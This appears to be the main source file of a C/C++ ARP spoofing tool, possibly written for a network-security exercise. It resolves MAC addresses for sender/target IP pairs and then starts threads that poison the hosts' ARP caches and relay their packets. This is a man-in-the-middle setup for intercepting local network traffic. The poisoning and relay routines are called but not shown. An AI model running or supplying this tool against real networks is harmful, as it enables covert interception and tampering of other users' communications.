#include "pch.h"

#include "function.h"
#include "headers.h"
#include <signal.h>

#define MAX_PAIRS 10

pthread_t infect_threads[MAX_PAIRS];
pthread_t relay_threads[MAX_PAIRS];
ArpInfectArgs* args_list[MAX_PAIRS];
int pair_count = 0;

volatile bool keep_running = true;

void intHandler(int dummy) {
    keep_running = false;
}
bool is_IPv4(u_int16_t ether_type);
bool is_TCP(u_int8_t protocol);

int main(int argc, char* argv[]) {
    if (argc < 4 || (argc % 2 == 1 && argc >= 4)) {
        print_err_command();
        return EXIT_FAILURE;
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", argv[1], errbuf);
        return -1;
    }

    signal(SIGINT, intHandler);

    uint8_t my_mac[6] = {0};
    char my_ipv4[INET_ADDRSTRLEN] = {0};
    uint8_t sender_mac[6] = {0};
    uint8_t target_mac[6] = {0};


    get_network_info(argv[1], my_ipv4, my_mac);

    for(int i = 2; i < argc; i += 2){
        if (pair_count >= MAX_PAIRS) break;
        char* sender_ip = argv[i];
        char* target_ip = argv[i + 1];

        uint8_t eth_dmac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
        uint8_t arp_tmac[6] = {0};

        send_arp_packet(pcap, eth_dmac, my_mac, ARP_OPER_RQUEST, my_mac, my_ipv4, arp_tmac, sender_ip);
        resolve_mac_addr(pcap, my_ipv4, sender_ip, sender_mac);

        send_arp_packet(pcap, eth_dmac, my_mac, ARP_OPER_RQUEST, my_mac, my_ipv4, arp_tmac, target_ip);
        resolve_mac_addr(pcap, my_ipv4, target_ip, target_mac);

        ArpInfectArgs* args = (ArpInfectArgs*)malloc(sizeof(ArpInfectArgs));
        args->pcap = pcap;
        memcpy(args->attacker_mac, my_mac, 6);
        args->sender_ip = strdup(sender_ip);
        memcpy(args->sender_mac, sender_mac, 6);
        args->target_ip = strdup(target_ip);
        memcpy(args->target_mac, target_mac, 6);

        args_list[pair_count] = args;

        pthread_create(&infect_threads[pair_count], nullptr, infect_arp_table, (void*)args);
        pthread_create(&relay_threads[pair_count], nullptr, relay_packets, (void*)args);

        pair_count++;
    }

    while (keep_running) sleep(1);

    for (int i = 0; i < pair_count; i++) {
        pthread_cancel(infect_threads[i]);
        pthread_cancel(relay_threads[i]);
        pthread_join(infect_threads[i], nullptr);
        pthread_join(relay_threads[i], nullptr);

        free(args_list[i]->sender_ip);
        free(args_list[i]->target_ip);
        free(args_list[i]);
    }

    pcap_close(pcap);
}

bool is_IPv4(u_int16_t ether_type) {
    if(ntohs(ether_type) == ETHER_TYPE_IPV4) return true;
    else                                return false;
}

bool is_TCP(u_int8_t protocol) {
    if(protocol == IPPROTO_TCP) return true;
    else                        return false;
}
